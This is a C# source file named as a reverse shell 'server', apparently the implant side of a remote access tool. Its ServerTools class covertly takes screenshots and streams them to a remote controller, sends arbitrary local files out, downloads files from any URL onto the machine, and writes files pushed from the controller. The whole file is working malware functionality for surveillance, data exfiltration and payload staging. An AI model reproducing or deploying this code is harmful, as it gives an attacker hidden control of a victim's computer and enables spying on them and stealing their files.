using System;
using System.Windows.Forms;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Linq;
using System.Net;
using System.Runtime.InteropServices;

namespace ReverseShellServer
{
    public class ServerTools
    {
        readonly BinaryWriter bw;
        readonly BinaryReader br;
        readonly StreamWriter sw;
        readonly StreamReader sr;

        public ServerTools(BinaryWriter bw, BinaryReader br, StreamWriter sw, StreamReader sr)
        {
            this.bw = bw;
            this.br = br;
            this.sw = sw;
            this.sr = sr;
        }


        public void TakeAndSendScreenShotToClient()
        {
            sw.WriteLine("{Screenshot:init}");
            sw.Flush();

            byte[] scData;

            using (var ms = new MemoryStream())
            {
                var bounds = GetScreenRectangle();
                using (var bitmap = new Bitmap(bounds.Width, bounds.Height))
                {
                    using (var graphics = Graphics.FromImage(bitmap))
                    {
                        graphics.CopyFromScreen(Point.Empty, Point.Empty, bounds.Size);
                    }

                    bitmap.Save(ms, ImageFormat.Png);
                }

                scData = ms.ToArray();
            }

            // Send the data length first
            bw.Write(scData.Length);
            bw.Flush();

            foreach (var data in scData)
            {
                bw.Write(data);
                bw.Flush();
            }
        }


        static Rectangle GetScreenRectangle()
        {
            try
            {
                // Resolve DPI issue (altered screen resolution)
                if (Environment.OSVersion.Version.Major >= 6)
                {
                    SetProcessDpiAwareness(ProcessDPIAwareness.ProcessPerMonitorDPIAware);
                }
            }
            catch (EntryPointNotFoundException)
            {
                // Exception occures if OS does not implement this API, just ignore it
            }

            return new Rectangle(0, 0, Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
        }


        public void DownloadFileFromUrl(string url)
        {
            sw.WriteLine("{UrlDownload:init}");
            sw.Flush();

            var newFile = url.Split('/').Last();

            var Client = new WebClient();
            try
            {
                Client.DownloadFile(url, newFile);
                sw.WriteLine("Success:" + newFile);
            }
            catch (IOException)
            {
                sw.WriteLine("Error:IO");
            }
            catch (Exception)
            {
                sw.WriteLine("Error:Web");
            }

            sw.Flush();
        }


        public void UploadFileToClient(string fileLocation)
        {
            sw.WriteLine("{UploadFileToClient:init}");
            sw.Flush();

            try
            {
                using (var readStream = new FileStream(fileLocation, FileMode.Open))
                {
                    var buffer = new byte[1];
                    while (readStream.Read(buffer, 0, 1) > 0)
                    {
                        bw.Write(buffer[0]);
                        bw.Flush();
                    }
                }

                sw.WriteLine("Success");
            }
            catch (Exception)
            {
                sw.WriteLine("Error");
            }

            sw.Flush();
        }


        public void ReceiveFileFromClient(string newFileLocation)
        {
            sw.WriteLine("{ReceiveFileFromClient:init}");
            sw.Flush();

            // Get data length
            var dataLength = br.ReadInt32();

            try
            {
                using (var fs = new FileStream(newFileLocation, FileMode.Create))
                {
                    var buffer = new byte[1];
                    for(int i = 0; i < dataLength; i++)
                    {
                        br.Read(buffer, 0, 1);
                        fs.Write(buffer, 0, 1);
                    }
                }

                sw.WriteLine("Success");
            }
            catch (Exception)
            {
                sw.WriteLine("Error");
            }

            sw.Flush();

            
        }


        public void CheckFileExist(string path)
        {
            sw.WriteLine(File.Exists(path) ? "true" : "false");
            sw.Flush();
        }



        enum ProcessDPIAwareness
        {
            ProcessDPIUnaware = 0,
            ProcessSystemDPIAware = 1,
            ProcessPerMonitorDPIAware = 2
        }

        [DllImport("shcore.dll")]
        private static extern int SetProcessDpiAwareness(ProcessDPIAwareness value);
    }
}
